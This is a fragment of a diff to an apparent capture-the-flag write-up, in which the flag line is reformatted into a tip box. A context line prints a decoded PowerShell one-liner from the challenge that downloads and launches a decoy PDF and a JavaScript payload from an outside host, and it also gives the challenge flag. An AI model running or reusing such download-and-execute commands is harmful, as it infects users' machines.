@@ -128,5 +128,7 @@ echo $dwQWf;
 iwr -Uri https://trickortreat.htb/boo.pdf -OutFile $env:TEMP\ Dropbox boo.pdf;$flag='HTB{tr1ck_0r_tr34t_g03s_wr0ng}';Start-Process $env:TEMP\ Dropbox boo.pdf;Start-Sleep -s 5;iwr -Uri https://trickortreat.htb/candy.js -OutFile $env:TEMP\cacndy.js;Start-Process $env:TEMP\candy.js;Exit
 ```
 
-> Flag: `HTB{tr1ck_0r_tr34t_g03s_wr0ng}`
+::: tip Flag
+`HTB{tr1ck_0r_tr34t_g03s_wr0ng}`
+:::
 
